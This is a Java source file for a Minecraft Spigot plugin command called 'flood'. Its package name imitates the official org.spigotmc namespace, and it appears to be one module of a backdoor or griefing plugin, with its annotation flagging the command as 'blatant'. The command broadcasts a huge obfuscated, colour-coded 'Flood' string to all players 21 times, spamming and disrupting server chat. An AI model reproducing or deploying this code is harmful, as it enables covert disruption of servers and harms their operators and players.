package org.spigotmc.commands.impl.server;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;

@CommandInfo (
    name = "flood",
    usage = "flood",
    desc = "Floods chat",
    aliases = "floods",
    blatant = true
)
public class Floods extends CommandListener{

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        String flood = "§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood";
        for (int x2 = 0; x2 <= 20; ++x2) {
            Bukkit.broadcastMessage((String)flood);
        }
    }
}
